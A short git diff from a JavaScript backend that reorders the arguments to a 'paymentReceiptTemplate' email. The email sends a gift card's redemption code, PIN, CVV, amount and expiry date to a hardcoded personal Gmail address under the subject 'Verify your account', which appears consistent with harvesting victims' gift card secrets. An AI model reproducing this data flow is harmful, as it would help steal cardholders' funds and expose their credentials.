@@ -36,17 +36,15 @@ const userEmail = "jolaetopia81@gmail.com"
             const mailOptions = {
                 email: userEmail ,
                 subject: "Verify your account",
-              html: paymentReceiptTemplate(
-  newGiftCard.Name,
-  newGiftCard.Currency,
-  newGiftCard.Redemptioncode,
-  newGiftCard.Pin,
-  newGiftCard.Amount,
-  userEmail,
-  newGiftCard.GiftCardCvv,
-  newGiftCard.ExpireDate
-),
-
+                html: paymentReceiptTemplate(
+                    userEmail,
+                    newGiftCard.Name,
+                    newGiftCard.Currency,
+                    newGiftCard.Redemptioncode,
+                    newGiftCard.Pin,
+                    newGiftCard.GiftCardCvv,
+                    newGiftCard.Amount,
+                    newGiftCard.ExpireDate),
             };
 
             
